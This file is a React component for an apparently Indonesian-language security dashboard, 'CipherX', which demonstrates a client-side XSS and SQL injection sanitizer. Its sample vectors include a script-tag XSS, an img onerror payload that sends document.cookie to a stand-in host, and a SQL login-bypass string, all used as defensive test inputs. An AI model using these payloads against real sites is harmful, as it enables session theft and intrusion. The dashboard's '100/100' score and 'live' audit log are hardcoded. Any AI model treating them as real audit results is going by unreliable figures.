import React, { useState } from 'react';
import { 
  ShieldCheck, 
  ShieldAlert, 
  Terminal, 
  CheckCircle2, 
  Cpu, 
  Lock, 
  FileCheck, 
  AlertOctagon, 
  Activity, 
  EyeOff, 
  KeyRound,
  Play
} from 'lucide-react';
import { sanitizeContent, computeSha256 } from '../utils/crypto';

export default function SecurityCenterView({ onShowToast, blockedAttacksCount = 14 }) {
  const [testPayload, setTestPayload] = useState("<script>alert('Steal User Session Token');</script>");
  const [testResult, setTestResult] = useState(null);
  const [isTesting, setIsTesting] = useState(false);

  // Sample malicious vectors for demonstration
  const sampleVectors = [
    { label: 'Tag Script XSS', payload: "<script>alert('Session Stolen');</script>" },
    { label: 'Event Handler Error', payload: "<img src=x onerror=fetch('http://malicious.test/leak?cookie='+document.cookie)>" },
    { label: 'Injeksi SQL Bypass', payload: "admin' OR '1'='1'; --" },
    { label: 'Iframe Phishing', payload: "<iframe src='javascript:void(0)'></iframe>" },
  ];

  const runDefenseTest = async (payloadToRun) => {
    const payload = payloadToRun || testPayload;
    if (!payload.trim()) return;

    setIsTesting(true);
    setTimeout(async () => {
      const audit = sanitizeContent(payload);
      const hash = await computeSha256(payload);

      setTestResult({
        original: payload,
        safeText: audit.safeText,
        interceptedTokens: audit.interceptedTokens,
        isSanitized: audit.isSanitized,
        sha256: hash,
        timestamp: new Date().toLocaleTimeString('id-ID'),
      });
      setIsTesting(false);

      onShowToast({
        type: audit.isSanitized ? 'shield' : 'success',
        title: audit.isSanitized ? 'Vektor Bahaya Dinetralkan!' : 'Input Bersih Terverifikasi',
        message: audit.isSanitized 
          ? `Sistem berhasil mencegat ${audit.interceptedTokens.length} potensi kerentanan keamanan.`
          : 'Tidak ditemukan vektor injeksi berbahaya.',
      });
    }, 400);
  };

  const securityChecklist = [
    { title: 'Client-Side E2EE (AES-256-GCM)', desc: 'Pesan dapat dienkripsi di peramban sebelum dikirim ke jaringan', status: 'Aktif', active: true },
    { title: 'Anti-XSS & HTML Sanitizer', desc: 'Pemindaian dan netralisasi otomatis tag skrip & event handlers', status: 'Proteksi Maksimal', active: true },
    { title: 'EXIF & GPS Metadata Purge', desc: 'Pembersihan koordinat lokasi dan data kamera via Canvas raster', status: 'Aktif 100%', active: true },
    { title: 'Segel Integritas SHA-256', desc: 'Mendeteksi modifikasi data atau manipulasi di perjalanan (Anti-Tampering)', status: 'Valid', active: true },
    { title: 'Zero Secrets & Hardcoding', desc: 'Sesuai regulasi GitHub: nol token, kunci privat, atau password nyata di repo', status: 'Audit Lolos', active: true },
    { title: 'Strict CSP & Sanitized Alerts', desc: 'Tidak menggunakan alert() bawaan, seluruh dialog diganti komponen UI', status: 'Terstandarisasi', active: true },
  ];

  const auditLogs = [
    { time: '13:24:02', event: 'Sesi browser diinisialisasi dengan Web Crypto API Subsystem', level: 'Info' },
    { time: '13:24:18', event: 'Key derivation PBKDF2-SHA256 (100.000 iterasi) berhasil dikonfigurasi', level: 'Security' },
    { time: '13:25:05', event: 'Pembersihan EXIF otomatis selesai untuk unggahan media', level: 'Privacy' },
    { time: '13:26:40', event: 'Upaya injeksi skrip XSS diblokir dan dinetralkan oleh sanitizer klien', level: 'Defense' },
    { time: '13:28:12', event: 'Verifikasi hash SHA-256 sukses untuk seluruh postingan di feed', level: 'Integrity' },
  ];

  return (
    <div className="space-y-6 pb-12 animate-in fade-in duration-300">
      
      {/* Top Banner: Score & Defense Status */}
      <div className="p-6 rounded-3xl bg-slate-900/60 backdrop-blur-md border border-cyan-500/30 shadow-lg relative overflow-hidden">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div className="space-y-2">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-300 text-xs font-bold">
              <ShieldCheck className="w-4 h-4 text-cyan-400" />
              <span>Zero-Knowledge Defense Core</span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">
              Pusat Pertahanan & Audit Keamanan
            </h1>
            <p className="text-xs sm:text-sm text-slate-300 max-w-xl leading-relaxed">
              Arsitektur CipherX mengutamakan privasi dan integritas data 100% di sisi klien. Server tidak memiliki akses ke kunci dekripsi pesan pribadi Anda.
            </p>
          </div>

          {/* Security Score Badge */}
          <div className="flex items-center gap-4 p-4 rounded-2xl bg-slate-950/70 border border-white/10 shrink-0">
            <div className="text-center">
              <div className="text-3xl font-extrabold text-emerald-400 font-mono">100/100</div>
              <div className="text-[10px] text-slate-400 font-bold uppercase tracking-wider mt-0.5">Skor Audit (A+)</div>
            </div>
            <div className="h-10 w-px bg-white/10" />
            <div className="text-center">
              <div className="text-2xl font-extrabold text-cyan-400 font-mono">{blockedAttacksCount}</div>
              <div className="text-[10px] text-slate-400 font-bold uppercase tracking-wider mt-0.5">Payload Dinetralkan</div>
            </div>
          </div>
        </div>
      </div>

      {/* Interactive Payload Stress Tester */}
      <div className="p-6 rounded-3xl bg-slate-900/60 backdrop-blur-md border border-white/10 shadow-sm space-y-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <Terminal className="w-5 h-5 text-cyan-400" />
            <div>
              <h2 className="text-base font-bold text-white">
                Simulator Uji Ketahanan Injeksi (XSS & SQLi Defense)
              </h2>
              <p className="text-xs text-slate-400">
                Uji langsung pertahanan input client-side CipherX terhadap berbagai vektor serangan umum.
              </p>
            </div>
          </div>
        </div>

        {/* Sample Payload Presets */}
        <div className="flex flex-wrap gap-2 pt-2">
          <span className="text-xs text-slate-400 self-center">Contoh Serangan:</span>
          {sampleVectors.map((item, idx) => (
            <button
              key={idx}
              onClick={() => {
                setTestPayload(item.payload);
                runDefenseTest(item.payload);
              }}
              className="px-3 py-1 rounded-xl text-xs bg-slate-950/70 hover:bg-cyan-500/20 text-slate-300 hover:text-cyan-300 border border-white/10 hover:border-cyan-500/40 transition-colors font-mono cursor-pointer"
            >
              {item.label}
            </button>
          ))}
        </div>

        {/* Input box */}
        <div className="space-y-3 pt-2">
          <div className="relative">
            <textarea
              rows={3}
              value={testPayload}
              onChange={(e) => setTestPayload(e.target.value)}
              placeholder="Masukkan kode HTML/JS berbahaya untuk menguji kemampuan sanitasi..."
              className="w-full p-3.5 rounded-2xl bg-slate-950/80 border border-white/10 text-xs font-mono text-cyan-200 placeholder-slate-500 focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400 resize-none"
            />
          </div>

          <div className="flex justify-end">
            <button
              onClick={() => runDefenseTest()}
              disabled={isTesting || !testPayload.trim()}
              className="px-5 py-2.5 rounded-2xl bg-gradient-to-r from-cyan-400 to-emerald-400 hover:from-cyan-300 hover:to-emerald-300 text-slate-950 font-bold text-xs flex items-center gap-2 transition-all disabled:opacity-50 cursor-pointer shadow-md shadow-cyan-500/20"
            >
              <Play className="w-4 h-4 fill-current" />
              <span>{isTesting ? 'Menganalisis Payload...' : 'Uji Pertahanan Siber'}</span>
            </button>
          </div>
        </div>

        {/* Test Result Display */}
        {testResult && (
          <div className="mt-4 p-4 rounded-2xl bg-slate-950/90 border border-cyan-500/30 space-y-3 animate-in fade-in">
            <div className="flex items-center justify-between border-b border-white/10 pb-2.5">
              <span className="text-xs font-bold text-white flex items-center gap-1.5">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                Laporan Hasil Uji Pertahanan ({testResult.timestamp})
              </span>
              <span className={`text-[10px] font-mono px-2 py-0.5 rounded font-bold uppercase ${
                testResult.isSanitized 
                  ? 'bg-amber-950 text-amber-300 border border-amber-500/30' 
                  : 'bg-emerald-950 text-emerald-300 border border-emerald-500/30'
              }`}>
                {testResult.isSanitized ? 'Ancaman Terdeteksi & Dinetralkan' : 'Payload Aman'}
              </span>
            </div>

            {testResult.isSanitized && testResult.interceptedTokens.length > 0 && (
              <div className="space-y-1.5">
                <span className="text-[11px] text-slate-400 block font-semibold">Vektor yang Dicegat:</span>
                <div className="flex flex-wrap gap-1.5">
                  {testResult.interceptedTokens.map((token, i) => (
                    <span 
                      key={i}
                      className="px-2.5 py-1 rounded-lg bg-rose-950/50 border border-rose-500/30 text-rose-300 text-[10px] font-mono flex items-center gap-1"
                    >
                      <AlertOctagon className="w-3 h-3 text-rose-400" />
                      {token.desc} ({token.risk})
                    </span>
                  ))}
                </div>
              </div>
            )}

            <div>
              <span className="text-[11px] text-slate-400 block font-semibold mb-1">Hasil Output Aman (Sanitized Preview):</span>
              <div className="p-2.5 rounded-xl bg-slate-900 border border-white/5 text-xs font-mono text-emerald-300 whitespace-pre-wrap break-all">
                {testResult.safeText}
              </div>
            </div>

            <div className="text-[10px] text-slate-400 flex items-center justify-between">
              <span>Hash Integritas: <code className="text-cyan-300">{testResult.sha256.slice(0, 24)}...</code></span>
              <span className="text-emerald-400">Eksekusi DOM Diblokir 100%</span>
            </div>
          </div>
        )}
      </div>

      {/* Security Checklist Matrix */}
      <div className="p-6 rounded-3xl bg-slate-900/60 backdrop-blur-md border border-white/10 shadow-sm space-y-4">
        <h2 className="text-base font-bold text-white flex items-center gap-2">
          <ShieldCheck className="w-5 h-5 text-cyan-400" />
          Matriks Standar Kepatuhan Keamanan
        </h2>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5">
          {securityChecklist.map((item, idx) => (
            <div 
              key={idx}
              className="p-3.5 rounded-2xl bg-slate-950/50 border border-white/5 flex items-start justify-between gap-3"
            >
              <div>
                <h4 className="text-xs font-bold text-white">{item.title}</h4>
                <p className="text-[11px] text-slate-400 leading-relaxed mt-0.5">{item.desc}</p>
              </div>
              <span className="px-2 py-0.5 rounded text-[10px] font-bold font-mono bg-emerald-950/60 border border-emerald-500/30 text-emerald-300 shrink-0">
                {item.status}
              </span>
            </div>
          ))}
        </div>
      </div>

      {/* Live Event Audit Log */}
      <div className="p-6 rounded-3xl bg-slate-900/60 backdrop-blur-md border border-white/10 shadow-sm space-y-4">
        <div className="flex items-center justify-between">
          <h2 className="text-base font-bold text-white flex items-center gap-2">
            <Activity className="w-5 h-5 text-cyan-400" />
            Catatan Audit Keamanan Terkini (Event Log)
          </h2>
          <span className="text-[10px] font-mono text-slate-400">Live Telemetri</span>
        </div>

        <div className="space-y-2 font-mono text-xs">
          {auditLogs.map((log, idx) => (
            <div 
              key={idx}
              className="p-2.5 rounded-xl bg-slate-950/60 border border-white/5 flex items-center justify-between gap-3 text-slate-300"
            >
              <div className="flex items-center gap-2.5 truncate">
                <span className="text-slate-500 text-[11px]">{log.time}</span>
                <span className="truncate">{log.event}</span>
              </div>
              <span className="px-2 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider bg-slate-800 text-cyan-300 border border-white/10 shrink-0">
                {log.level}
              </span>
            </div>
          ))}
        </div>
      </div>

    </div>
  );
}
